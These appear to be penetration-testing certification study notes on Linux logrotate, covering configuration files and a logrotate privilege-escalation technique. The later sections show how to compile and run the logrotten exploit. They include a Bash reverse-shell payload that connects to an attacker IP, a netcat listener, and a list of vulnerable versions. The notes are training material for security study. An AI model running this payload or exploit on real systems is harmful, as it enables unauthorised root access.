## 1. What Is Logrotate?

Linux systems generate large numbers of log files.

If logs continually grow:

```text
Logs
 ↓
Grow larger
 ↓
Consume disk space
 ↓
Potentially fill disk
```

**`logrotate`** manages these logs by:

- Rotating/renaming logs
    
- Archiving old logs
    
- Removing old logs
    
- Creating new logs
    
- Compressing old logs
    

It can make decisions based on:

- `size`
    
- `age`
    
- configured actions
    

---

# 2. Logrotate Configuration

Main configuration:

```text
/etc/logrotate.conf
```

View it:

```bash
cat /etc/logrotate.conf
```

Useful commands:

```bash
man logrotate
```

```bash
logrotate --help
```

### Important options

|Option|Meaning|
|---|---|
|`-d` / `--debug`|Test/debug without performing actions|
|`-f` / `--force`|Force rotation|
|`-m` / `--mail`|Specify mail command|
|`-s` / `--state`|Specify state file|
|`-v` / `--verbose`|Display detailed messages|
|`-l` / `--log`|Specify log file|
|`--version`|Show version|

---

# 3. How Log Rotation Works

Logrotate commonly works by renaming old logs and creating new ones.

Example:

```text
Before:

app.log
```

After rotation:

```text
app.log
app.log.1
app.log.2
app.log.3
```

Conceptually:

```text
Current log
    ↓
Rotation
    ↓
Old log renamed
    ↓
New log created
```

---

# 4. Logrotate + Cron

Logrotate is commonly executed periodically through **cron**.

```text
Cron
  ↓
logrotate
  ↓
Read configuration
  ↓
Rotate configured logs
```

The global configuration is:

```text
/etc/logrotate.conf
```

and additional configurations are commonly stored in:

```text
/etc/logrotate.d/
```

---

# 5. Important `/etc/logrotate.conf` Options

Example:

```text
weekly
```

Rotate logs weekly.

```text
su root adm
```

Use `root` as the user and `adm` as the group for operations where applicable.

```text
rotate 4
```

Keep four rotated logs/backlogs.

```text
create
```

Create a new empty log file after rotation.

```text
include /etc/logrotate.d
```

Load additional configuration files from:

```text
/etc/logrotate.d/
```

---

# 6. `/etc/logrotate.d/`

List configurations:

```bash
ls /etc/logrotate.d/
```

Example:

```text
alternatives
apport
apt
bootlog
btmp
dpkg
mon
rsyslog
ufw
wtmp
```

Inspect an individual configuration:

```bash
cat /etc/logrotate.d/dpkg
```

Example:

```text
/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

### Meaning

```text
monthly
    ↓
Rotate monthly

rotate 12
    ↓
Keep 12 rotations

compress
    ↓
Compress rotated logs

delaycompress
    ↓
Delay compression

missingok
    ↓
Don't complain if log is missing

notifempty
    ↓
Don't rotate empty logs

create 644 root root
    ↓
Create new log with specified permissions/owner/group
```

---

# 7. Logrotate State File

Logrotate tracks when logs were last rotated in:

```text
/var/lib/logrotate.status
```

View it:

```bash
sudo cat /var/lib/logrotate.status
```

Example:

```text
/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

The module notes that rotation can be forced using:

```bash
logrotate -f
```

or:

```bash
logrotate --force
```

---

# 8. Logrotate Privilege Escalation

The key vulnerability is a **misconfigured log file + privileged logrotate execution**.

The module specifies these requirements:

### Requirement 1

We need:

```text
WRITE permissions on the log files
```

### Requirement 2

Logrotate must execute as:

```text
root
```

or another privileged user.

### Requirement 3

A vulnerable version must be present.

The module lists:

```text
3.8.6
3.11.0
3.15.0
3.18.0
```

---

# 9. Attack Chain

```text
Writable log
     +
Privileged logrotate
     +
Vulnerable version
     ↓
Logrotate abuse
     ↓
Attacker-controlled action
     ↓
Privileged execution
     ↓
Root
```

### CPTS mindset

Don't just see:

```text
logrotate installed
```

Instead determine:

```text
Version?
   ↓
Who runs it?
   ↓
Which logs does it rotate?
   ↓
Can I write to those logs?
   ↓
Which configuration options are used?
   ↓
Is the version vulnerable?
```

---

# 10. `logrotten`

The module uses a proof-of-concept tool called:

```text
logrotten
```

It is used to exploit vulnerable logrotate configurations when the required conditions are satisfied.

The module demonstrates obtaining and compiling it:

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

---

# 11. Payload

The example uses a Bash reverse shell as the payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Conceptually:

```text
logrotten
   ↓
Trigger logrotate vulnerability
   ↓
Execute payload
   ↓
Reverse connection
   ↓
Attacker listener
```

---

# 12. Identify the Logrotate Configuration

Before using the exploit, determine which relevant option is configured.

The module checks:

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

Example output:

```text
create
```

Therefore:

```text
create
```

is the option being used.

This matters because the exploit needs to be adapted to the logrotate behavior/configuration present on the target.

---

# 13. Start Listener

The example starts:

```bash
nc -nlvp 9001
```

This waits for the target to connect.

```text
ATTACKER
10.10.14.2:9001
       ↑
       │ reverse shell
       │
TARGET
```

---

# 14. Run `logrotten`

The module then executes:

```bash
./logrotten -p ./payload /tmp/tmp.log
```

Breakdown:

```text
-p ./payload
      ↓
Payload to execute

/tmp/tmp.log
      ↓
Target log file
```

If the vulnerable conditions are satisfied and logrotate processes the target log, the payload can execute with the privileges of logrotate.

The example receives:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Therefore the resulting shell is:

```text
ROOT
```

---

# 15. Complete Attack Flow

```text
                 LOGROTATE PRIVESC
                        │
                        ↓
              Enumerate logrotate
                        │
                        ↓
              Identify version
                        │
                        ↓
             Check configuration
                        │
                        ↓
             Find writable log
                        │
                        ↓
          Is logrotate privileged?
                        │
                       YES
                        ↓
             Is version vulnerable?
                        │
                       YES
                        ↓
                  logrotten
                        │
                        ↓
                   Payload
                        │
                        ↓
             Privileged execution
                        │
                        ↓
                      ROOT
```

---

# 16. Enumeration Workflow

### Step 1 — Check version

```bash
logrotate --version
```

or:

```bash
logrotate --help
```

### Step 2 — Read configuration

```bash
cat /etc/logrotate.conf
```

### Step 3 — Check additional configurations

```bash
ls /etc/logrotate.d/
```

Then inspect interesting files:

```bash
cat /etc/logrotate.d/<file>
```

### Step 4 — Check state

```bash
cat /var/lib/logrotate.status
```

### Step 5 — Find writable files/logs

```bash
find / -type f -writable 2>/dev/null
```

Then determine whether any writable files are being rotated.

---

# 17. What Makes a Logrotate Finding Interesting?

### 🔴 High-value combination

```text
Vulnerable logrotate
        +
Writable log
        +
Privileged execution
        ↓
Potential PrivEsc
```

### Example

```text
/var/log/example.log
        │
        └── Writable by attacker
                  │
                  ↓
              logrotate
                  │
                  └── Runs as root
                         │
                         ↓
                    Vulnerability
                         │
                         ↓
                       ROOT
```

---

# 18. Connection to Cron Abuse

This module connects directly to the previous **Cron Job Abuse** module.

```text
Cron Abuse
    ↓
Scheduled privileged script
    ↓
Writable script
    ↓
Root execution
```

Logrotate:

```text
Cron
    ↓
Privileged logrotate
    ↓
Writable log
    ↓
Logrotate vulnerability
    ↓
Root execution
```

So the broader concept is:

> **Find an automated privileged process and determine whether you can influence something it processes.**

---

# 🔥 CPTS Must-Know

### Important files

```text
/etc/logrotate.conf
/etc/logrotate.d/
/var/lib/logrotate.status
```

### Important commands

```bash
logrotate --help
```

```bash
logrotate --version
```

```bash
cat /etc/logrotate.conf
```

```bash
ls /etc/logrotate.d/
```

```bash
cat /var/lib/logrotate.status
```

### Force rotation

```bash
logrotate -f <config>
```

### Vulnerable versions from the module

```text
3.8.6
3.11.0
3.15.0
3.18.0
```

### Exploit tool

```text
logrotten
```

### Key configuration options

```text
create
compress
```

---

# 🧠 Final Revision Card

```text
LOGROTATE PRIVESC
══════════════════════════════════

logrotate
    ↓
Manages / rotates logs
    ↓
Usually scheduled periodically
    ↓
Check:
/etc/logrotate.conf
/etc/logrotate.d/
/var/lib/logrotate.status

PrivEsc requirements:

1. Writable log
2. Privileged logrotate
3. Vulnerable version

        ↓

       logrotten
        ↓
      payload
        ↓
Privileged execution
        ↓
       ROOT
```

### 🔑 Memory trick

**`Writable log + privileged vulnerable logrotate = investigate immediately.`**